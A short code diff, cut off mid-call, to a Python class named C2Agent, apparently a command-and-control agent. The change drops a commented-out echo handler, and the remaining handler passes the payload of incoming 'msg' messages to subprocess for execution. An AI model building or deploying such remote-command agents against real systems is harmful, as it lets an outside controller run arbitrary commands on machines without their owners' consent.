@@ -54,10 +54,8 @@ class C2Agent:
         payload = message.get("payload", "")
         print(f"[agent] received {msg_type}: {payload}")
 
-        #if msg_type == "msg":
-        #    return {"type": "echo", "payload": payload}
+
         if msg_type == "msg":
-        # ✅ Execute the command from the payload
             try:
                 print("executing")
                 result = subprocess.check_output(
